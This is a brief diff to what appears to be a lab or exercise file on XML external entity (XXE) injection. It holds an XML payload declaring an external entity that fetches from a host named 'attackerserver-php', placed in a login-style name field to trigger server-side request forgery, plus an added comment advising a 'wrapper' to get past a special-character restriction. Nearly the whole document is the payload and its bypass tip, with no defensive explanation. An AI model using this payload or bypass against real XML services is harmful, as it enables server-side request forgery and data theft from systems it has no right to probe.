@@ -1,1 +1,3 @@
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY a SYSTEM "http://attackerserver-php:8888/ssrf/index.html">]><root><name>tst &a;</name><password>tett</password></root>
+
+# doesn't work because of special characters. You can make use of the wrapper to bypass this restriction :)
